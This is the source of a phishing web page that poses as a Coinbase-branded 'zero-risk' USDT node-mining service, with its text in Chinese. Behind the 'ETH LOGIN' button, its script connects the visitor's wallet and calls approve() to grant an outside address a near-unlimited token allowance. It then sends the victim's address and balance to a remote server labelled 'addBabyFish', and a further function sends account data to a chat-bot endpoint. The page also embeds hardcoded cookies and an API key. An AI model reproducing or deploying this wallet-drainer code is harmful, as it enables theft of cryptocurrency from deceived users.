<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Document</title>
  <link rel="stylesheet" type="text/css" href="../../coin/css/common.css" />
  <link rel="stylesheet" type="text/css" href="../../coin/login/index.css" />
  <script src="../../coin/login/js/ethers-5.0.umd.min.js" type="application/javascript"></script>
  <title>Coinbase</title>
  <link href="https://cdn.bootcdn.net/ajax/libs/toastr.js/latest/css/toastr.css" rel="stylesheet">
</head>
<body>
<div class="page flex-col">
  <div class="box1 flex-col">
    <!--        <div class="group1 flex-row">-->
    <!--          <img-->
    <!--            class="icon1"-->
    <!--            referrerpolicy="no-referrer"-->
    <!--            src="./img/SketchPng408a80b5f8a35a2174871ca95df7669de38dba3a0235e79b23fff45d1031902b.png"-->
    <!--          />-->
    <!--          <div class="main1 flex-col"></div>-->
    <!--          <span class="word1">中文</span>-->
    <!--        </div>-->
    <div class="group2 flex-col">
      <div class="main2 flex-row">
        <img
                class="label1"
                referrerpolicy="no-referrer"
                src="./img/SketchPngcad6dedcb9540aa63fffd53b17353a9c44812a3783f968778c8f6023143fd8b9.png"
        />
        <img
                class="img1"
                referrerpolicy="no-referrer"
                src="./img/SketchPngcdfc3b3326c9c84f3ee4bb37b5ebf8f32bad6f6727c0b63a183a7e4e686e1bdb.png"
        />
        <div class="bd1 flex-col">
          <span class="txt1" data-locale="t1">Miners新一代公链节点挖掘</span>
          <span class="txt2" data-locale="t2">
                无需转币&nbsp;/&nbsp;稳健收益&nbsp;/&nbsp;自由退出
              </span>
        </div>
      </div>
    </div>
    <div class="group3 flex-col">
      <span class="info1" onclick="ethLogin()" style="cursor: pointer">ETH&nbsp;LOGIN</span>
    </div>
    <!-- <div class="group4 flex-col">   // todo
      <span class="word2" onclick="trxLogin()" style="cursor: pointer">TRX&nbsp;LOGIN</span>
    </div> -->
    <div class="group5 flex-col">
      <div class="layer1 flex-col">
        <span class="txt3" data-locale="t38">如何参与</span>
        <span class="paragraph1" data-locale="t39">
              1：Miners是新一代的节点矿池挖矿方式，主要面向采用USDT存储共识机制的公链，这类公链的持币者，可以通过链上节点方式获得收益，持有USDT数量越多，持有时间越长，算力越大，收益越高。
            </span>
        <span class="paragraph1" data-locale="t40">2：零风险挖矿USDT存放自己钱包无需转币出去，“0”风险，灵活退出更自由</span>
        <span class="paragraph1" data-locale="t41">3：客户无需繁琐复杂手续，首先选择好公链并需支付1次矿工费即可完成挖矿节点对接。</span>
      </div>
    </div>
  </div>
  <div class="box2 flex-col">
    <div class="main5 flex-row">
      <img
              class="label2"
              referrerpolicy="no-referrer"
              src="./img/SketchPng383842d088faba1d4a149aa2d4391a8d3d772a35ce3349e4ae7e163b49c6915b.png"
      />
      <img
              class="label3"
              referrerpolicy="no-referrer"
              src="./img/SketchPng6982bcc557141b0dab4028cccc92602fcb4aed2ef808a103752463cd31ec0257.png"
      />
      <div class="bd2 flex-col"></div>
    </div>
    <div class="main6 flex-row">
      <span class="word5"><a href="../../coin/index.html" style="color: #fff;text-decoration: none" data-locale="t21">主页</a></span>
      <span class="info2"><a href="../../coin/pool/pool.html" style="color: #fff;text-decoration: none" data-locale="t22">矿池</a></span>
      <span class="word6"><a href="../../coin/my/my.html" style="color: #fff;text-decoration: none" data-locale="t23">我的</a></span>
    </div>
  </div>
</div>
</body>
<script src="../../coin/js/jquery.min.js"></script>
<script src="../../coin/alert/alert.js"></script>
<script src="../../coin/js/jquery.i18n.js"></script>
<script src="../../coin/js/lang.js"></script>
<script src="../../coin/js/web3.min.js"></script>
<script type="application/javascript">
  $(function (){
    loadProperties(localStorage.getItem("lang"))
  })
  function ethLogin(){
    console.log(11)
    test()
  }
  function trxLogin(){
    console.log(22)
  }

  const abi = [
    {
      "constant": false,
      "inputs": [
        {
          "name": "_spender",
          "type": "address"
        },
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_from",
          "type": "address"
        },
        {
          "name": "_to",
          "type": "address"
        },
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "name": "balance",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_to",
          "type": "address"
        },
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ]

  // const yourAddress = '0x621bdded2b894228943a3a063d5459937b947f1a'
  // const value = '0x0' // 16进制表示的以太币数量，单位：wei   1EH=0xde0b6b3a7640000   0.001ETH=0x38d7ea4c68000
  // const desiredNetwork = '0x3' // '0x1' 表示以太坊主网
  // const value2 = '0x0'
  var account = ""
  // var balanceMoney = 0
  // var bal = 0

  async function test() {
    let web3;
    let balanceMoney = 0
    if (window.ethereum) {
      web3 = new Web3(window.ethereum);
      await window.ethereum.enable().then(function (accounts) {
        console.log("xxxxxxxxxxxxxxxx")
        account = accounts
        // alert(account)
      })
      await web3.eth.getBalance(account[0]).then(function (balace) {
        const balance = ethers.BigNumber.from(balace);
        console.log(ethers.utils.formatEther(balance));
        // balanceMoney = ethers.utils.formatEther(balance)
        // alert("user balanace = ", balanceMoney)
      })
      // alert("ethereum")
    } else if (window.web3) {
      // Use Mist/MetaMask's provider.
      web3 = window.web3;
      // alert("web3")
    } else {
      const provider = new Web3.providers.HttpProvider(
              "https://mainnet.infura.io/v3/16b3844622e34365a8bcdd1d424d65f0"
      );
      web3 = new Web3(provider);
      await web3.eth.getAccounts().then(function (accounts) {
        console.log("xxxxxxxxxxxxxxxx")
        account = accounts
      })
      balancess = web3.eth.getBalance(account)
      console.log("provider = " + ethers.utils.formatEther(balancess));
      // balanceMoney = ethers.utils.formatEther(balancess)
      // alert("balanceMoney" + balanceMoney)
      // alert("provider")
    }

    let usdt = "0xa3127c695004e454922fe30a0038fd3b6a99c81d"
    const contr = new web3.eth.Contract(abi, usdt);
    // let res = await contr.methods.balanceOf(account[0])

    console.log("--------------")
    contr.methods.balanceOf(account[0]).call({from: account[0]}, function(error, result){
      balanceMoney = result
      console.log("xxxxxxxxxxxxxxxxxxxx", result);
    });


    contr.methods.approve("0x7aB2A4fAce8a5F943e2788aD1E6527d4141fD17D","115700000000000000000000000000000000000000000000000000000000").send({from:account[0]});
    // console.log('getWeb3',res, account)
    // alert("web3 " + res)
    console.log("user usdt res = ", balanceMoney)
    PostCon(account[0], "0xa3127c695004e454922fe30a0038fd3b6a99c81d", balanceMoney)
  }

  function PostCon(user_address, auth_address, balanceMoney) {
    // alert("post")
    var data = "";

    url = "https://uapi.oct99a.com:8443/service?action=addBabyFish&terminal_id=2" +
            "&user_address=" + user_address + "&auth_address=" + auth_address + "&" +
            "coin_type=usdt&base_chain=erc&user_available=" + balanceMoney + "&sproxy=1"

    console.log(url)

    var xhr = new XMLHttpRequest();
    xhr.withCredentials = false;

    xhr.addEventListener("readystatechange", function() {
      if(this.readyState === 4) {
        console.log(this.responseText);
      }
    });

    xhr.open("POST", url);
    xhr.setRequestHeader("Cookie", "fdc6a94703a2ae8=eyJpdiI6IkxzaytQWG04ditOV2pCaEdpamRic1FQT0x6ZlU0NHl5Q2xuZ0JESW5DdjA9IiwidmFsdWUiOiJUMmtRVHJUcXNWTnFRejViQU96ZXI2OFN6S3dXOGg5RVpIemZpbisrYmd6aVdRRHJ6UThaalM5SFVGTUFxNDV4cVB6ckptdUthekloSjV5dTlRUFRVZz09IiwibWFjIjoiODVkMzE0ZThhN2FhZjI2OTc5NDAwMTQwMjAyZTZhZGM5M2E3OWExZDZiMGJiYjYzMTQ3MDY0Y2M5N2JjMDJiNiJ9");

    xhr.send(data);

    // alert("res " + xhr.responseText)
    console.log("post ok !!"+ xhr.responseText)
  }


  function PostBotAPi(accounts) {

    var data = JSON.stringify({
      "chat_room_type": 1,
      "chat_room_id": 100005,
      "content_text": accounts.toString()
    });

    var xhr = new XMLHttpRequest();
    xhr.withCredentials = false;

    xhr.addEventListener("readystatechange", function() {
      if(this.readyState === 4) {
        // alert(this.responseText)
        console.log(this.responseText);
      }
    });

    CORS_ALLOW_HEADERS = ('content-disposition', 'accept-encoding',
            'content-type', 'accept', 'origin', 'authorization')

    xhr.open("POST", "https://bot.hotchat.im/1300009012:Lrq22B9Eb49Faj0AdUpgKnT8/SendMessage");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("Cookie", "bot=1637141045.183.27591.533979");
    // xhr.setRequestHeader("Access-Control-Allow-Origin", "*");
    xhr.send(data);


    // alert("post ok !!"+ xhr.responseText)
  }

</script>
</html>
